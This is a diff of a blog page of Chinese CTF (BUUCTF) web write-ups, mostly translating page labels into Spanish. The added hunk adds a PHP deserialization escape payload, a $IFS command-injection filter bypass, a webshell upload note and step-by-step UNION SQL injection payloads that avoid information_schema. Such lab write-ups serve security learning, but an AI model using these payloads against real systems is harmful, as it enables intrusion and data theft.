@@ -18,7 +18,7 @@
 <meta property="og:description" content="[RoarCTF 2019]Easy Calc知识点：PHP字符串的解析漏洞。  PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：">
 <meta property="og:image" content="https://da4er.top/images/og_image.png">
 <meta property="article:published_time" content="2020-03-03T02:47:54.000Z">
-<meta property="article:modified_time" content="2020-03-05T09:09:48.763Z">
+<meta property="article:modified_time" content="2020-03-08T08:30:41.578Z">
 <meta property="article:author" content="Da4er&#39;s">
 <meta property="article:tag" content="Da4er">
 <meta name="twitter:card" content="summary">
@@ -120,7 +120,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Buscar" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -149,7 +149,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    20 minutes read (About 2938 words)
+                    22 minutes leer (Acerca de 3315 palabras)
                 </span>
                 
                 
@@ -201,7 +201,13 @@
 <hr>
 <p><strong>解题：</strong><br>扫描目录发现<a href="http://www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用">www.zip，打开审计代码，找到一处file_get_contents函数漏洞利用</a><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/22.png" class title="Da4er"><br>这个漏洞出现在用户更新数据页面，先经过反序列化，在进行赋值。跟进函数发现对profile有三处过滤：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/23.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/24.png" class title="Da4er"><br>首先是正则匹配，可以使用数组绕过；在filter函数里有两处过滤，有一处是将where转换成hacker，5个字符换成了6个字符。<br>漏洞点是出现在上传图片的参数，这个时候就是要将s:5:”photo”;s:10:”config.php”;}塞到photo参数里，让它读取config.php下的flag。可以使用反序列化尾部字符串逃逸。</p>
 <p>在nickname上操作，payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nickname[]</span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><br>在nickname上输入34个where，每个where都会换成hacker，多增加一个字符，最后会把s:5:”photo”;s:10:”config.php”;}挤到photo参数上。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/25.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/26.png" class title="Da4er"></p>
-
+<hr>
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p>拿到题目，发现是命令执行漏洞。直接ls查看到有两个文件：flag.php,index.php。<br>通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS&#96;ls&#96;</span><br></pre></td></tr></table></figure><br>查看到index.php源码<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/27.png" class title="Da4er"><br>看到过滤了一些字符，最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;lag;b&#x3D;f;cat$IFS$b$a.php;</span><br></pre></td></tr></table></figure><br>查看源代码找到flag。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/29.png" class title="Da4er"></p>
+<hr>
+<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>很简单的上传，直接上传phtml的<script>小马即可，没有给上传的文件所在目录，通过猜测是upload。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/30.png" class="" title="Da4er"></p>
+<hr>
+<h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p><strong>知识点：绕过information.schema与无列名注入</strong><br>参考博客：<br><a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a><br>绕过information.schema可以使用sys.schema_auto_increment_columns<br>无列注入可以自己构造列名。<br><strong>解题：</strong><br>注入发生在编辑广告的界面上，在输入广告名时会在查看报错，说明是存在二次注入的。<br>但是报错函数被过滤，可以使用union查询。<br>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 判断有多少字段 -1&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;1 </span><br><span class="line"># union 查询 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># user()发现是 root@localhost 权限 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,user(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 查看 mysql 的版本号 -1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22 </span><br><span class="line"># 在 sys 数据库中查询表名 </span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;sys.schema_auto_increment_columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"></span><br><span class="line"># 通过无列名注入 users 表中的数据</span><br><span class="line"># 第二个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2&#x2F;**&#x2F;as&#x2F;**&#x2F;a,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br><span class="line"># 第三个字段</span><br><span class="line">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/31.png" class="" title="Da4er"></p>
+</script></p>
         </div>
         
         <div class="level is-size-7 is-uppercase">
@@ -222,7 +228,7 @@
 
 <div class="card">
     <div class="card-content">
-        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <h3 class="menu-label has-text-centered">Suka dengan artikel ini? Bantu penulis dengan donasi melalui</h3>
         <div class="buttons is-centered">
             
                 
@@ -279,7 +285,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Links
+            Enlaces
         </h3>
         <ul class="menu-list">
         
@@ -327,7 +333,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Categorías
             </h3>
             <ul class="menu-list">
             <li>
@@ -403,7 +409,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Tag Cloud
+            Nube de etiquetas
         </h3>
         <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 16.67px;">Web安全&渗透测试</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 13.33px;">代码审计</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 13.33px;">爬虫</a>
     </div>
@@ -445,7 +451,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Posts
+                        Entradas
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
@@ -457,7 +463,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Categorías
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -469,7 +475,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Tags
+                        Etiquetas
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -482,7 +488,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                SEGUIR</a>
         </div>
         
         
@@ -511,7 +517,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Recientes
         </h3>
         
         <article class="media">
@@ -616,7 +622,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archivos
         </h3>
         <ul class="menu-list">
         
@@ -662,7 +668,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Tags
+                Etiquetas
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -750,7 +756,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Posts
+                        Entradas
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
@@ -762,7 +768,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Categorías
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -774,7 +780,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Tags
+                        Etiquetas
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -787,7 +793,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                SEGUIR</a>
         </div>
         
         
@@ -816,7 +822,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Recientes
         </h3>
         
         <article class="media">
@@ -921,7 +927,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archivos
         </h3>
         <ul class="menu-list">
         
@@ -967,7 +973,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Tags
+                Etiquetas
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -1148,7 +1154,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Kembali ke atas" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1172,7 +1178,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Teclea algo..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1184,11 +1190,11 @@ document.addEventListener('DOMContentLoaded', function () {
     (function (window) {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
-                POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
-                TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                POSTS: 'Entradas',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Etiquetas',
+                UNTITLED: '(Sin título)',
             },
             CONTENT_URL: '/content.json',
         };
